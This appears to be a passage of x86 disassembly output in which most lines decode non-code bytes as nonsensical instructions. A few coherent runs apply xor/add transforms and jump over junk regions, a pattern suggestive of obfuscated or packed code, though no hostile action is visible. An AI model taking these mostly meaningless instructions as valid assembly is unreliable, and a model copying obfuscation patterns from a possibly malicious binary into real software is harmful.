  4019a1:	adc    DWORD PTR [edi+0x380bd08b],ebx
  4019a7:	scas   eax,DWORD PTR es:[edi]
  4019a8:	xor    al,0x2a
  4019aa:	xor    eax,0xb82a080f
  4019af:	fld    DWORD PTR [ebx-0x6ae3a18e]
  4019b5:	fsubr  st(5),st
  4019b7:	pop    esi
  4019b8:	cld    
  4019b9:	mov    bh,0xa2
  4019bb:	xchg   ebx,eax
  4019bc:	push   0xffffffb2
  4019be:	imul   ebp,DWORD PTR ss:[edx-0x38],0xbb97fa38
  4019c6:	mov    esi,ecx
  4019c8:	cmp    bh,cl
  4019ca:	leave  
  4019cb:	xor    DWORD PTR [ebx+0x1d263a26],esi
  4019d1:	add    ch,dl
  4019d3:	dec    eax
  4019d4:	int3   
  4019d5:	test   al,0x0
  4019d7:	sub    ah,al
  4019d9:	lds    edi,FWORD PTR [esi-0x35daad62]
  4019df:	sub    BYTE PTR [edi-0x65],ah
  4019e2:	jp     0x401980
  4019e4:	mov    ds,WORD PTR [ebp-0x4f22bbe2]
  4019ea:	mov    ch,0x61
  4019ec:	cmc    
  4019ed:	ds pop es
  4019ef:	pop    esi
  4019f0:	fidiv  WORD PTR [edi-0x17]
  4019f3:	imul   ebp,DWORD PTR [ebp+0x3a],0x66
  4019f7:	xchg   esp,eax
  4019f8:	fimul  DWORD PTR [edi]
  4019fa:	mov    dl,0x8d
  4019fc:	mov    ebp,0x907a662b
  401a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a02:	std    
  401a03:	mov    al,ds:0x83599e4d
  401a08:	std    
  401a09:	jnp    0x4019d7
  401a0b:	in     eax,0xb0
  401a0d:	out    dx,al
  401a0e:	bsf    edi,DWORD PTR [eax-0x41]
  401a12:	cmp    DWORD PTR [edx*2+0x3b3de8fc],ecx
  401a19:	mov    cl,0x6d
  401a1b:	(bad)  
  401a1c:	cmp    ecx,DWORD PTR [ebx+esi*8]
  401a1f:	fcomp  st(5)
  401a21:	cdq    
  401a22:	xchg   ebp,eax
  401a23:	push   ebp
  401a24:	ins    DWORD PTR es:[edi],dx
  401a25:	push   0x77
  401a27:	ror    esi,0xa7
  401a2a:	jg     0x401a2c
  401a2c:	imul   ebp,edi,0x43
  401a2f:	call   0x98da7be5
  401a34:	cld    
  401a35:	fiadd  DWORD PTR [esi-0x55fa64f4]
  401a3b:	sbb    bl,dh
  401a3d:	enter  0xee0b,0xb3
  401a41:	sbb    dl,0x25
  401a44:	aad    0x18
  401a46:	adc    ah,bh
  401a48:	fsub   DWORD PTR [ebp+0x442b94b6]
  401a4e:	aaa    
  401a4f:	push   edi
  401a50:	or     DWORD PTR [ecx],eax
  401a52:	fnsave [edx+0x76]
  401a55:	addr16 cmp al,0xbc
  401a58:	inc    esp
  401a59:	retf   0x9535
  401a5c:	es call 0x96c64326
  401a62:	pop    ds
  401a63:	outs   dx,BYTE PTR ds:[esi]
  401a64:	aam    0x5a
  401a66:	sbb    edx,edx
  401a68:	cld    
  401a69:	pop    edi
  401a6a:	out    dx,eax
  401a6b:	mov    dl,0x23
  401a6d:	cmp    BYTE PTR [edx+ebp*2-0x93019bb],bh
  401a74:	gs jbe 0x401ad7
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	and    esi,DWORD PTR [ecx-0x8]
  401a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a3d
  401a98:	popa   
  401a99:	push   edx
  401a9a:	shl    esi,0xe0
  401a9d:	icebp  
  401a9e:	xor    al,ch
  401aa0:	pop    ebx
  401aa1:	cli    
  401aa2:	cmp    DWORD PTR [edi+0x25a15b06],edx
  401aa8:	adc    ebx,edx
  401aaa:	jmp    0x23f3:0x85fdde96
  401ab1:	imul   ebp,DWORD PTR [edx+ecx*1-0x347c7ba2],0xffffffc0
  401ab9:	pop    edi
  401aba:	lock (bad) 
  401abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401abd:	cwde   
  401abe:	sub    al,0x44
  401ac0:	nop
  401ac1:	adc    DWORD PTR [edx+0x2e2f3122],ebx
  401ac7:	push   esp
  401ac8:	div    BYTE PTR [esi]
  401aca:	dec    esi
  401acb:	mov    ch,0x54
  401acd:	pop    esp
  401ace:	stos   DWORD PTR es:[edi],eax
  401acf:	and    BYTE PTR [ebp-0x5e],ch
  401ad2:	pushf  
  401ad3:	bound  edx,QWORD PTR [edx-0x513032ee]
  401ad9:	or     BYTE PTR [ecx-0x56],dh
  401adc:	jmp    0xfa00d71d
  401ae1:	lea    esi,[edx-0x42a78068]
  401ae7:	mov    esp,0xe57a7a35
  401aec:	sub    al,0x18
  401aee:	retf   
  401aef:	scas   eax,DWORD PTR es:[edi]
  401af0:	push   es
  401af1:	pop    ecx
  401af2:	int3   
  401af3:	das    
  401af4:	jbe    0x401b1e
  401af6:	imul   ebp,esp,0xe66f398f
  401afc:	fstp   QWORD PTR gs:[ebp-0x8]
  401b00:	jge    0x401aad
  401b02:	xor    ecx,DWORD PTR [ecx-0x60]
  401b05:	ins    BYTE PTR es:[di],dx
  401b07:	cmp    edx,esi
  401b09:	pop    edi
  401b0a:	loopne 0x401af6
  401b0c:	icebp  
  401b0d:	pop    esi
  401b0e:	fidivr DWORD PTR [ebx]
  401b10:	pop    es
  401b11:	div    DWORD PTR [ebp+ebp*1-0x3e]
  401b15:	pushf  
  401b16:	fs fwait
  401b18:	(bad)  
  401b19:	or     al,0xe4
  401b1b:	repz jge 0x401b2a
  401b1e:	mov    dl,0xa2
  401b20:	mov    dh,0x1e
  401b22:	cs call 0x7ab6:0x43511df9
  401b2a:	inc    ebp
  401b2b:	xor    edi,edx
  401b2d:	sub    eax,0x95ae8c62
  401b32:	xchg   edi,eax
  401b33:	ins    DWORD PTR es:[edi],dx
  401b34:	pushf  
  401b35:	and    ebp,DWORD PTR [edi-0xd]
  401b38:	rcl    DWORD PTR [ebx-0x3f0f6482],0xc4
  401b3f:	push   0x36a0903b
  401b44:	mov    ds:0x2fda3bc9,eax
  401b49:	mov    ah,0x16
  401b4b:	imul   esi,DWORD PTR [edx+0x456497c8],0xffffffbd
  401b52:	mov    esi,0xf07b43f1
  401b57:	push   0x5d7c19c0
  401b5c:	ret    
  401b5d:	cmp    eax,0x28f6ef8a
  401b62:	out    0x16,al
  401b64:	adc    DWORD PTR ds:[ecx-0x48],ebx
  401b68:	scas   eax,DWORD PTR es:[edi]
  401b69:	(bad)  
  401b6a:	(bad)  
  401b6b:	and    BYTE PTR [ebx-0x5e],bh
  401b6e:	jp     0x401bbb
  401b70:	mov    ebx,0x3dc836c6
  401b75:	xchg   esi,eax
  401b76:	sbb    al,0x67
  401b78:	xchg   ebp,eax
  401b79:	in     al,dx
  401b7a:	add    eax,0x67ee8df7
  401b7f:	cmp    BYTE PTR [edx+eax*2-0x67],cl
  401b83:	mov    dl,0x5a
  401b85:	stos   BYTE PTR es:[edi],al
  401b86:	mov    ds:0x1316025e,eax
  401b8b:	mov    eax,0x7c9034fc
  401b90:	mov    bl,0x78
  401b92:	fwait
  401b93:	dec    esi
  401b94:	lods   eax,DWORD PTR ds:[esi]
  401b95:	sub    al,BYTE PTR [ecx+esi*8-0x7f]
  401b99:	sbb    eax,0xf89b206d
  401b9e:	(bad)  
  401b9f:	int3   
  401ba0:	sub    al,bh
  401ba2:	jp     0x401bce
  401ba4:	push   eax
  401ba5:	push   ebx
  401ba6:	dec    edi
  401ba7:	push   ebp
  401ba8:	mov    al,ds:0xb09a3a51
  401bad:	out    0x14,eax
  401baf:	dec    esi
  401bb0:	aad    0x75
  401bb2:	lods   al,BYTE PTR ds:[esi]
  401bb3:	dec    eax
  401bb4:	pop    ebp
  401bb5:	push   edi
  401bb6:	fsubr  DWORD PTR [edi-0x134e0601]
  401bbc:	in     al,dx
  401bbd:	aad    0x76
  401bbf:	(bad)  
  401bc0:	mov    DWORD PTR [esi+edi*2+0x1a82fdb9],esi
  401bc7:	arpl   WORD PTR [ecx+0x50e85bc0],si
  401bcd:	jae    0x401c0a
  401bcf:	dec    DWORD PTR [edi-0x60]
  401bd2:	ror    DWORD PTR [ebx],cl
  401bd4:	xor    esi,ebp
  401bd6:	retf   
  401bd7:	inc    ebp
  401bd8:	jl     0x401c32
  401bda:	and    al,0x26
  401bdc:	scas   eax,DWORD PTR es:[edi]
  401bdd:	mov    ecx,0x86520d47
  401be2:	xchg   esp,eax
  401be3:	adc    BYTE PTR [edi],al
  401be5:	dec    edi
  401be6:	imul   ebp,eax,0xfffffff5
  401be9:	imul   esp,DWORD PTR [eax-0x32dc5a44],0xb38ace13
  401bf3:	(bad)  
  401bf4:	out    0x29,eax
  401bf6:	mov    ds:0x40173c46,al
  401bfb:	nop
  401bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bfd:	mov    DWORD PTR [eax+eax*2+0x77],edi
  401c01:	pop    ss
  401c02:	pop    esp
  401c03:	push   ss
  401c04:	adc    DWORD PTR [ebx+eiz*1],edx
  401c07:	mov    ebx,0x7e195059
  401c0c:	hlt    
  401c0d:	xchg   edx,eax
  401c0e:	fsub   DWORD PTR [edi+0x25baf7bf]
  401c14:	cmp    ah,dl
  401c16:	dec    edx
  401c17:	mov    edx,0x8b12043c
  401c1c:	inc    ebp
  401c1d:	mov    al,0x8b
  401c1f:	dec    ebp
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	in     eax,dx
  401c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c42:	jecxz  0x401c6b
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c3c
  401c4d:	dec    ebx
  401c4e:	hlt    
  401c4f:	dec    ebx
  401c50:	aaa    
  401c51:	xchg   ecx,eax
  401c52:	stos   DWORD PTR es:[edi],eax
  401c53:	mov    esi,0xce084f80
  401c58:	mov    eax,ds:0x91084f45
  401c5d:	jbe    0x401be3
  401c5f:	retf   0xc672
  401c62:	push   esi
  401c63:	pop    ecx
  401c64:	xchg   esi,eax
  401c65:	(bad)  
  401c66:	aad    0xb4
  401c68:	sti    
  401c69:	loop   0x401ca9
  401c6b:	outs   dx,BYTE PTR ds:[esi]
  401c6c:	or     ebx,DWORD PTR cs:[ebx+ebx*4]
  401c70:	sub    cl,BYTE PTR [edx]
  401c72:	pop    ss
  401c73:	clc    
  401c74:	int3   
  401c75:	add    BYTE PTR [edi+0x65],ah
  401c78:	outs   dx,BYTE PTR ds:[esi]
  401c79:	cdq    
  401c7a:	xchg   ecx,eax
  401c7b:	jle    0x401c46
  401c7d:	add    BYTE PTR ds:0x3557212f,ch
  401c83:	xor    eax,0x8ea31f6c
  401c88:	pushf  
  401c89:	mov    cs,WORD PTR [edx+0xe64e137]
  401c8f:	lahf   
  401c90:	mov    ebx,0x9e420c82
  401c95:	bound  ebx,QWORD PTR [edx]
  401c97:	ins    DWORD PTR es:[edi],dx
  401c98:	inc    ecx
  401c99:	xor    DWORD PTR [ebx+0x36],0x14
  401c9d:	loopne 0x401c79
  401c9f:	(bad)  
  401ca1:	dec    ebp
  401ca2:	mov    dl,0xb0
  401ca4:	nop
  401ca5:	xchg   ebp,eax
  401ca6:	rcl    BYTE PTR [edi+0x6f],1
  401ca9:	icebp  
  401caa:	or     BYTE PTR [ebx+edi*8],ch
  401cad:	sbb    DWORD PTR [eax+edx*8-0x10483a22],ecx
  401cb4:	sub    ebp,DWORD PTR [ebp+0x60]
  401cb7:	shl    DWORD PTR [edx+0x1842ccff],0x0
  401cbe:	into   
  401cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cc0:	test   DWORD PTR [edx+0x48],edx
  401cc3:	outs   dx,DWORD PTR ds:[esi]
  401cc4:	ret    0x2fe2
  401cc7:	add    eax,0x42bbca4e
  401ccc:	or     eax,0x5aa19cc1
  401cd1:	in     eax,0x46
  401cd3:	test   al,0xce
  401cd5:	xor    DWORD PTR [ebx],eax
  401cd7:	aaa    
  401cd8:	gs and al,0x8c
  401cdb:	daa    
  401cdc:	cmp    eax,DWORD PTR [edx-0x4c]
  401cdf:	mov    al,0x3
  401ce1:	dec    edi
  401ce2:	sub    BYTE PTR [edx],dh
  401ce4:	(bad)  
  401ce5:	dec    ecx
  401ce6:	inc    ecx
  401ce7:	adc    dh,ah
  401ce9:	ds (bad) 
  401ceb:	jne    0x401d64
  401ced:	adc    dl,dh
  401cef:	out    0xc0,eax
  401cf1:	xchg   edx,eax
  401cf2:	sbb    al,0x2c
  401cf4:	mov    bl,BYTE PTR [edx-0x3c]
  401cf7:	fsubr  QWORD PTR [ebx+edi*2-0x71]
  401cfb:	lock call 0x953fd5ba
  401d01:	lds    ecx,FWORD PTR [esi+0x73b9f305]
  401d07:	retf   0xb6fd
  401d0a:	push   ss
  401d0b:	xchg   BYTE PTR [eax+edx*2],ch
  401d0e:	ds jno 0x401d1c
  401d11:	jecxz  0x401ce0
  401d13:	ret    
  401d14:	(bad)  
  401d15:	fmul   st,st(1)
  401d17:	lock pusha 
  401d19:	pop    esi
  401d1a:	fimul  WORD PTR ds:0x7fdb9aee
  401d20:	gs popa 
  401d22:	ret    
  401d23:	jae    0x401cf9
  401d25:	or     eax,0xdd9507c4
  401d2a:	adc    al,0x7f
  401d2c:	push   cs
  401d2d:	les    edi,FWORD PTR [esi+0x43053211]
  401d33:	inc    esp
  401d34:	fs push edi
  401d36:	pushf  
  401d37:	imul   esi,DWORD PTR [ebx+0x28],0x6a
  401d3b:	add    bh,0x4c
  401d3e:	push   ss
  401d3f:	(bad)  
  401d40:	fdiv   st,st(2)
  401d42:	retf   
  401d43:	shr    BYTE PTR [ecx],1
  401d45:	je     0x401ce1
  401d47:	lds    eax,FWORD PTR [edx]
  401d49:	out    dx,eax
  401d4a:	push   eax
  401d4b:	das    
  401d4c:	pushf  
  401d4d:	or     edx,DWORD PTR [edi+ebx*2]
  401d50:	dec    eax
  401d51:	push   cs
  401d52:	jecxz  0x401d24
  401d54:	loop   0x401ce3
  401d56:	pop    esp
  401d57:	cmp    eax,DWORD PTR [eax]
  401d59:	repnz add BYTE PTR [edx],al
  401d5c:	push   edx
  401d5d:	or     ebp,edx
  401d5f:	sbb    bl,BYTE PTR [esi-0x59ccc3b5]
  401d65:	fwait
  401d66:	stc    
  401d67:	jp     0x401d1c
  401d69:	adc    bh,al
  401d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d6c:	aam    0x7e
  401d6e:	sub    eax,0x1a8e7e8c
  401d73:	jnp    0x401def
  401d75:	jmp    0xf3bf:0x4447bfa3
  401d7c:	mov    edi,0x4da3248d
  401d81:	hlt    
  401d82:	(bad)  
  401d83:	in     al,dx
  401d84:	pop    edi
  401d85:	popa   
  401d86:	add    dh,BYTE PTR [esi+esi*2+0x61362654]
  401d8d:	shr    BYTE PTR [edi],0xee
  401d90:	rcl    BYTE PTR [edi],1
  401d92:	out    0x2e,eax
  401d94:	xchg   BYTE PTR [ebp-0x34],bh
  401d97:	imul   esp,DWORD PTR [esp+eax*2],0xffffff98
  401d9b:	stc    
  401d9c:	ret    
  401d9d:	cmp    BYTE PTR [esi-0x550475b3],0x82
  401da4:	nop
  401da5:	and    ch,BYTE PTR [ebp-0x7a]
  401da8:	dec    ebp
  401da9:	ins    BYTE PTR es:[edi],dx
  401daa:	jle    0x401d81
  401dac:	mov    bh,0x68
  401dae:	out    dx,al
  401daf:	int    0x85
  401db1:	stos   DWORD PTR es:[edi],eax
  401db2:	inc    esi
  401db3:	sbb    eax,0x48976bb0
  401db8:	enter  0x6f76,0x7d
  401dbc:	dec    ebp
  401dbd:	lahf   
  401dbe:	push   esp
  401dbf:	pop    edx
  401dc0:	add    DWORD PTR [eax-0x25dfe24b],ebx
  401dc6:	fcomp  DWORD PTR [ebx]
  401dc8:	push   es
  401dc9:	retf   
  401dca:	shl    BYTE PTR [edi-0x2f],0x6d
  401dce:	loop   0x401d6f
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x6c45b7c8],ebp
  401e0d:	fst    QWORD PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e0c
  401e17:	mov    dl,dh
  401e19:	mov    cl,BYTE PTR [edi+0x1c]
  401e1c:	inc    edx
  401e1d:	leave  
  401e1e:	dec    eax
  401e1f:	jns    0x401e14
  401e21:	jl     0x401e99
  401e23:	pop    esp
  401e24:	retf   0x63d3
  401e27:	cmp    BYTE PTR cs:[eax+0xc419b8c],dl
  401e2e:	mov    ch,0x97
  401e30:	ins    BYTE PTR es:[di],dx
  401e32:	cdq    
  401e33:	in     al,0x39
  401e35:	aad    0x1
  401e37:	xchg   esp,eax
  401e38:	mov    esp,0xeaed74be
  401e3d:	loop   0x401e58
  401e3f:	or     eax,0xe915bb88
  401e44:	sub    BYTE PTR [eax-0x418b0f9a],0xd5
  401e4b:	xchg   ebx,eax
  401e4c:	dec    esi
  401e4d:	rcl    BYTE PTR [ecx],1
  401e4f:	push   edx
  401e50:	mov    dh,0xc9
  401e52:	jbe    0x401e85
  401e54:	(bad)  
  401e55:	fst    DWORD PTR [ebp-0x1b]
  401e58:	(bad)  
  401e59:	mov    ebp,0x3ef26ef5
  401e5e:	fisubr DWORD PTR [ecx+eax*1+0x1a]
  401e62:	mov    ch,0x49
  401e64:	cmp    al,0x67
  401e66:	jecxz  0x401e2b
  401e68:	mov    gs,WORD PTR [ebp+eiz*1+0x70a54a80]
  401e6f:	scas   eax,DWORD PTR es:[edi]
  401e70:	fmul   QWORD PTR [eax-0x7a]
  401e73:	sbb    BYTE PTR [esi+0x6b30912f],dl
  401e79:	inc    ebx
  401e7a:	jecxz  0x401e75
  401e7c:	ror    DWORD PTR [edx],0xa6
  401e7f:	enter  0x20f2,0x2d
  401e83:	or     eax,0x2a17cb21
  401e88:	adc    BYTE PTR [eax+0x1c0675a8],bl
  401e8e:	push   cs
  401e8f:	or     DWORD PTR [esi+0x5b2299d1],edx
  401e95:	shl    BYTE PTR [eax],1
  401e97:	sub    eax,0x489d570a
  401e9c:	push   ebx
  401e9d:	les    edx,FWORD PTR [esi+0x70456b06]
  401ea3:	test   al,0xc1
  401ea5:	jp     0x401e35
  401ea7:	sub    ah,bh
  401ea9:	cli    
  401eaa:	cmp    al,0xb5
  401eac:	js     0x401e96
  401eae:	es (bad) 
  401eb0:	ficom  DWORD PTR [esi-0x6fe944f2]
  401eb6:	adc    BYTE PTR [eax+0x52],bl
  401eb9:	pop    edx
  401eba:	mov    edi,0x466da9f7
  401ebf:	rol    al,cl
  401ec1:	jecxz  0x401e67
  401ec3:	sbb    DWORD PTR [ebx-0x68],ebp
  401ec6:	mov    WORD PTR [ecx+0x2f11c382],gs
  401ecc:	jecxz  0x401e56
  401ece:	sbb    dl,BYTE PTR [edx-0x7e]
  401ed1:	cmp    eax,0xc3f6f55
  401ed6:	cs inc ebp
  401ed8:	(bad)  
  401ed9:	retf   0x2d76
  401edc:	outs   dx,DWORD PTR ds:[esi]
  401edd:	mov    ah,0x9c
  401edf:	sbb    edx,ebx
  401ee1:	mov    ds:0x369dff90,eax
  401ee6:	jmp    0x401eb8
  401ee8:	jo     0x401f1a
  401eea:	ss stos DWORD PTR es:[edi],eax
  401eec:	cmp    esp,DWORD PTR [edi+0x624225fa]
  401ef2:	cmc    
  401ef3:	call   0x82f8:0x79f6669a
  401efa:	jbe    0x401ebf
  401efc:	push   ss
  401efd:	call   0xa226:0x77ffc95e
  401f04:	mov    al,0x6
  401f06:	xlat   BYTE PTR ds:[ebx]
  401f07:	mov    ebp,0x499afb96
  401f0c:	test   DWORD PTR [ebp+0x33a316cc],esp
  401f12:	xchg   BYTE PTR [eax+ebp*1+0x3c0f9605],ch
  401f19:	enter  0xed6,0xe0
  401f1d:	jb     0x401f83
  401f1f:	xchg   ebp,eax
  401f20:	sbb    eax,DWORD PTR [edi+eiz*8]
  401f23:	xchg   ebp,eax
  401f24:	mov    al,0x5b
  401f26:	rcr    BYTE PTR [ecx],0xef
  401f29:	lock rol DWORD PTR [ebx],0xa6
  401f2d:	push   ebx
  401f2e:	and    ah,BYTE PTR ds:0x3e6f8c61
  401f34:	add    BYTE PTR [esi],ch
  401f36:	inc    esp
  401f37:	push   ebx
  401f38:	xchg   ebx,eax
  401f39:	test   DWORD PTR [esi+0x30],esp
  401f3c:	aad    0xe8
  401f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3f:	push   ss
  401f40:	xchg   ebx,eax
  401f41:	sub    DWORD PTR [eax-0x50],esi
  401f44:	mov    al,0xeb
  401f46:	pop    edi
  401f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f48:	adc    eax,0xbd0cc1a1
  401f4d:	fild   QWORD PTR [ecx-0x69d65c68]
  401f53:	cmp    BYTE PTR fs:[edi+ebp*4-0x71652f20],al
  401f5b:	lock xor esp,eax
  401f5e:	cmp    eax,0x82a5a4b6
  401f63:	ret    0x1e4
  401f66:	push   edx
  401f67:	fisub  DWORD PTR [ebx]
  401f69:	test   BYTE PTR [esi],0x30
  401f6c:	pop    ss
  401f6d:	and    bl,ch
  401f6f:	in     eax,dx
  401f70:	and    esp,0x490a7503
  401f76:	(bad)  
  401f77:	jmp    0x7dd21443
  401f7c:	mov    ecx,0x4fb229f9
  401f81:	sbb    eax,0xb3a11140
  401f86:	mov    al,cl
  401f88:	inc    ebx
  401f89:	mov    edx,0x7653d2ce
  401f8e:	xchg   esi,eax
  401f8f:	lock mov ebx,0x3125bdc7
  401f95:	pop    ebx
  401f96:	sahf   
  401f97:	cmp    BYTE PTR [edx],0x62
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x6daea63c
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x40203a
  401fcc:	cmp    bh,BYTE PTR [edi+0x2853a3fa]
  401fd2:	es rol edi,1
  401fd5:	rol    BYTE PTR [ecx],0xc2
  401fd8:	push   edi
  401fd9:	das    
  401fda:	icebp  
  401fdb:	cmp    edx,DWORD PTR [edx+0x40fe74bd]
  401fe1:	jmp    0x401f72
  401fe3:	cld    
  401fe4:	jge    0x402017
  401fe6:	mov    ds:0xb151e679,eax
  401feb:	aad    0xeb
  401fed:	out    0xc0,al
  401fef:	daa    
  401ff0:	mov    ebx,DWORD PTR [esi-0x27f9cd8f]
  401ff6:	test   ecx,ebx
  401ff8:	add    eax,0xe934dc0e
  401ffd:	push   edi
  401ffe:	and    cl,BYTE PTR [edx]
  402000:	(bad)  [esi-0x18]
  402003:	xchg   ecx,eax
  402004:	arpl   WORD PTR [edi+0x6cf3308d],ax
  40200a:	aaa    
  40200b:	cmp    al,0xf6
  40200d:	addr16 lahf 
  40200f:	and    BYTE PTR [ebp+0x7acc1620],0x4c
  402016:	mov    eax,0xa5dda904
  40201b:	nop
  40201c:	add    esp,ebp
  40201e:	pushf  
  40201f:	xlat   BYTE PTR ds:[ebx]
  402020:	mov    bl,0x22
  402022:	mov    eax,0xb12cb095
  402027:	nop
  402028:	sti    
  402029:	sbb    dh,BYTE PTR [ecx+ecx*1]
  40202c:	iret   
  40202d:	adc    BYTE PTR [edi+0x71408558],bh
  402033:	pop    ebp
  402034:	jmp    0xf2087b1c
  402039:	(bad)  
  40203a:	cdq    
  40203b:	lea    ecx,[ebp+0x5aa3479]
  402041:	lds    esi,FWORD PTR [ebp-0x1128b019]
  402047:	test   eax,0x8ea2a2e
  40204c:	inc    ecx
  40204d:	jp     0x401fff
  40204f:	add    BYTE PTR [edi],ch
  402051:	das    
  402052:	mov    dl,0xbb
  402054:	adc    al,0x43
  402056:	bound  ebp,QWORD PTR [eax-0x41]
  402059:	(bad)  
  40205a:	xor    eax,0xa5d4faaa
  40205f:	fld    QWORD PTR [ecx]
  402061:	sbb    al,0x86
  402063:	mov    dl,ah
  402065:	int    0x37
  402067:	fcomp  QWORD PTR [eax+0x58]
  40206a:	mov    ebx,0x57714d5a
  40206f:	jno    0x4020ae
  402071:	scas   al,BYTE PTR es:[edi]
  402072:	mov    ds:0x765387a,eax
  402077:	xchg   DWORD PTR [eax-0x40],esp
  40207a:	push   edi
  40207b:	in     eax,0xe8
  40207d:	cdq    
  40207e:	mov    ebx,0x5f6ebe89
  402083:	jp     0x402019
  402085:	ret    
  402086:	ins    BYTE PTR es:[edi],dx
  402087:	mov    ds:0xa5d2253b,eax
  40208c:	sbb    DWORD PTR [eax+0x11],ecx
  40208f:	cmp    eax,0xf11fd86
  402094:	mov    ds:0x448f99d3,al
  402099:	loope  0x402099
  40209b:	and    al,0x5a
  40209d:	push   ds
  40209e:	aas    
  40209f:	mov    bl,0x4b
  4020a1:	popa   
  4020a2:	stc    
  4020a3:	mov    DWORD PTR [eax],0xb455a4e4
  4020a9:	fiadd  WORD PTR [esi-0x4]
  4020ac:	fsub   DWORD PTR [eax+0x4e7293fb]
  4020b2:	pop    edi
  4020b3:	or     BYTE PTR [ecx+0x605145cb],0x5c
  4020ba:	jmp    0xe8283ca4
  4020bf:	jmp    0x402105
  4020c1:	dec    edi
  4020c2:	xchg   ebp,eax
  4020c3:	xor    BYTE PTR [ebx+0x440925a0],bh
  4020c9:	popf   
  4020ca:	push   esp
  4020cb:	inc    edi
  4020cc:	xchg   ecx,eax
  4020cd:	or     eax,0xe1337da0
  4020d2:	jl     0x40208b
  4020d4:	cli    
  4020d5:	scas   al,BYTE PTR es:[edi]
  4020d6:	mov    edi,DWORD PTR [eax-0x74bc42e5]
  4020dc:	test   eax,0x9af28c46
  4020e1:	ds ja  0x402138
  4020e4:	cli    
  4020e5:	and    DWORD PTR [ecx+edx*8+0x4a],eax
  4020e9:	mov    ds:0xcd9e14ac,al
  4020ee:	retf   
  4020ef:	or     al,0xb4
  4020f1:	ss push esi
  4020f3:	cmp    BYTE PTR [ecx+0x1a],ch
  4020f6:	and    DWORD PTR [ecx],esp
  4020f8:	mov    ah,0xcd
  4020fa:	pop    edx
  4020fb:	call   0xec015b0f
  402100:	pop    es
  402101:	mov    esi,0x3bab6ab3
  402106:	cmp    DWORD PTR [edx],eax
  402108:	ss and eax,eax
  40210b:	lahf   
  40210c:	cmp    ch,BYTE PTR [ebp+ebx*8+0x7e]
  402110:	mov    dh,0x47
  402112:	fwait
  402113:	cmp    al,0xf0
  402115:	add    bl,cl
  402117:	push   edi
  402118:	je     0x4020b4
  40211a:	int    0xbe
  40211c:	dec    ebp
  40211d:	xor    eax,0x27fd7b2a
  402122:	fst    QWORD PTR [ebx+0x81eba24]
  402128:	jb     0x4020dd
  40212a:	xor    DWORD PTR [eax+0x3e05a740],edi
  402130:	pop    ebp
  402131:	mov    WORD PTR [esi],fs
  402133:	mov    ds:0xed854aa1,eax
  402138:	popa   
  402139:	sbb    BYTE PTR [esp+eiz*4-0x2e],dl
  40213d:	cmp    ebp,DWORD PTR [ecx+0x7ea6d5d7]
  402143:	(bad)
  402146:	std    
  402147:	inc    ebx
  402148:	sti    
  402149:	sub    al,0x86
  40214b:	mov    ebx,0x5074580e
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	mov    ds:0x1e3a8346,al
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
